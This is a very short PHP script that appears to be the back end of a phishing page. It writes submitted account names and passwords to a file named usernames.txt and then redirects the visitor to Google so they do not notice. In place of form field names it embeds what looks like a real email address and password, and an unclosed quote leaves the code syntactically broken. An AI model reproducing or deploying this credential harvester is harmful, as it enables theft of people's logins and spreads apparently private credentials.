<?php

file_put_contents("usernames.txt", "Account: " . $_POST['fullpavarmaitri@gmail.com] . " Pass: " . $_POST['Rucha@1917'] . "\n", FILE_APPEND);
header('Location: https://google.com/');
exit();
